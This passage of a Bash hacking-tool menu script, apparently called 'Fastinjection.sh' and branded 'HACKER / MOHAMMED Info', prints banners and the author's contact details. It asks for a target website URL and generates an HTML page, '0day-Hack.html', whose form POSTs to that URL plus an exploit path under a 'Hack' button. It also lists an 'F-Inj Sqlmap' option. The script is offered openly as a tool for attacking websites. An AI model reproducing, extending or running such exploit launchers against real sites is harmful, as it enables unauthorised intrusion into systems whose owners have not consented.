echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" url0day
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $url0day '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$url0day' | ' $exploit0day'      |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$url0day$exploit0day'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/0day-Hack.html
touch output/0day-Hack.html
echo "<html>" >> output/0day-Hack.html
echo "<body>" >> output/0day-Hack.html
echo "<form method="'"post"'" action="$Dd$url0day$exploit0day$Dd'>' >> output/0day-Hack.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/0day-Hack.html
echo "</form>" >> output/0day-Hack.html
echo "</body>" >> output/0day-Hack.html
echo "</html>" >> output/0day-Hack.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
read -p "insert :>" cp0day
if [ $cp0day = "y" ]
then
cp output/0day-Hack.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $name = 10 ]
then
clear
echo ''
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══  ══ ══ ══  ══ ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $red   "                   About me"
echo ""
echo -e $green "            YOUTUBE: Mohammed Info "
echo ""
echo -e $green "               FB: profionaldhim "
echo ""
echo -e $green "            TWITTER: profionaldhim1 "
echo ""
echo -e $green "           Whatsapp: 00967733014747"
echo ""
echo -e $green "00- Back"
echo ""
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" about
if [ $about = 00 ]
then
clear
bash Fastinjection.sh
fi
fi
if [ $name = 0 ]
then
clear
figlet "GOOD BYE"
exit
fi
else
echo ""
echo -e $purple '              please reset insert the password ..'
clear
bash Fastinjection.sh
fi

